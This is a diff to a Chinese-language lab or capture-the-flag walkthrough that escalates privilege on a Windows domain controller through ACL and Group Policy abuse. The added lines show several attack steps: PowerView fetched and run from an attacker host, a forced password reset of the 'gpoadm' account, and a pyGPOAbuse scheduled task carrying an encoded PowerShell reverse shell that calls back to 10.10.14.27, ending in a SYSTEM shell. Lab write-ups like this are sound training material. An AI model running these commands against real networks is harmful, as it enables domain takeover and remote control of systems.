@@ -328,6 +328,7 @@ There may be a short delay until the server is ready.
 ![图片](images/2026030602.png)
 #### Amelia Griffiths -> MemberOf -> LEGACY@BABY2.VL
 #### LEGACY@BABY2.VL -> WriteDacl -> GPOADM@BABY2.VL,GPO-MANAGEMENT@BABY2.VL
+#### 用户对组策略对象拥有什么 ACL gpoadm？（区分大小写）GenericAll
 ![图片](images/2026030603.png)
 ```
 1. “Amelia Griffiths”这个用户属于老用户组的一员。
@@ -344,4 +345,58 @@ Serving HTTP on 0.0.0.0 port 8011 (http://0.0.0.0:8011/) ...
 ```
 ```
 PS C:\Users\amelia.griffiths> iex (iwr -usebasicparsing http://10.10.14.27:8011/PowerView.ps1)
+PS C:\Users\amelia.griffiths> add-domainobjectacl -rights "all" -targetidentity "gpoadm" -principalidentity "Amelia.Griffiths"
+PS C:\Users\amelia.griffiths> $cred = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+PS C:\Users\amelia.griffiths> set-domainuserpassword gpoadm -accountpassword $cred
+```
+```
+[★]$ nxc smb 10.129.234.72 -u gpoadm -p 'Password123!'
+
+SMB         10.129.234.72   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:False)
+SMB         10.129.234.72   445    DC               [+] baby2.vl\gpoadm:Password123!
+```
+### Privilege Escalation
+#### 最后，若要通过组策略对象来滥用通用所有访问控制列表（GenericAll ACL），请使用 pyGPOAbuse。首先，让我们克隆该存储库。
+https://github.com/Hackndo/pyGPOAbuse
+#### 在使用此功能之前，我们需要先了解相关通用策略组的 GPO 编号。
+#### 注意：正如我们之前所见，我们有 2 个 GPO 可供选择，但只需要其中一个就能利用该漏洞。
+#### 要获取 GPO 编号，通过“bloodhound”工具，先选择相关 GPO 的节点。然后，在“Node Info”选项卡中，您可以看到“GPO File Path ”字段。该路径的最后部分即为 GPO ID - 31B2F340-016D-11D2-945F00C04FB984F9 。
+#### 点击那个 GPO 节点,图标通常是 蓝色文档样式
+![图片](images/2026030604.png)
+![图片](images/2026030605.png)
+#### 一旦我们了解了这一点，就可以按照以下方式执行 pyGPOAbuse.py 脚本。
+```
+[★]$ cd pyGPOAbuse
+[~/pyGPOAbuse][★]$ ls
+assets   pygpoabuse     pyproject.toml  requirements.txt
+LICENSE  pygpoabuse.py  README.md       setup.py
+[~/pyGPOAbuse][★]$ python3 pygpoabuse.py baby2.vl/gpoadm:'Password123!' -command "Powershell -exec bypass -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMgA3ACIALAA5ADAAOQAwACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==" -dc-ip 10.129.234.72 -gpo-id "31B2F340-016D-11D2-945F-00C04FB984F9"
+SUCCESS:root:ScheduledTask TASK_60e9109b created!
+[+] ScheduledTask TASK_60e9109b created!
+```
+#### 在这里，我们正在使用之前所使用的相同的 PowerShell 反向 shell。请注意，您可以使用任何您想要的命令（例如，添加一个新的管理员用户）
+#### 一旦创建了定时任务，我们就需要按照以下方式更新组策略：
+```
+PS C:\Users\amelia.griffiths> gpupdate
+Updating policy...
+
+
+
+Computer Policy update has completed successfully.
+
+User Policy update has completed successfully.
+
+
+
+
+```
+#### 一旦完成更新，我们的指令就会被执行，从而为我们提供一个反向 shell，其身份标识为 NT AUTHORITY\SYSTEM
+#### 侦听的端口是和之前的一样，不一样的操作是先开侦听再刷新gpupdate
+```
+[★]$ nc -lvnp 9090
+listening on [any] 9090 ...
+connect to [10.10.14.27] from (UNKNOWN) [10.129.234.72] 58631
+whoami
+nt authority\system
+PS C:\Windows\system32> type ..\..\Users\Administrator\Desktop\root.txt
 ```
